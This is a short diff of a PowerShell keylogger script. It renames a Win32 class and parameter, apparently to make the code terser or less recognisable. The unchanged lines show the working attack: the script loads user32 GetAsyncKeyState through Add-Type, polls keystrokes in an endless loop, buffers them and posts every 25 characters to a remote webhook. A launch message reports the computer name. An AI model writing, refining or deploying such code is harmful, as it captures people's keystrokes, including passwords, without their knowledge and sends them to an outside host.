@@ -5,8 +5,8 @@ iwr $webhook -Method Post -Body (@{content="Keylogger natif lancé – $env:COMP
 $code = @'
 using System;
 using System.Runtime.InteropServices;
-public class Win32 {
-    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
+public class K {
+    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int k);
 }
 '@
 
@@ -14,9 +14,9 @@ Add-Type $code
 
 $buf = ''
 while($true){
-    Start-Sleep -Milliseconds 40
+    Start-Sleep -m 40
     for($i=8;$i -le 254;$i++){
-        if([Win32]::GetAsyncKeyState($i) -eq -32767){
+        if([K]::GetAsyncKeyState($i) -eq -32767){
             $buf += [char]$i
             if($buf.Length -ge 25){
                 iwr $webhook -Method Post -Body (@{content=$buf}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
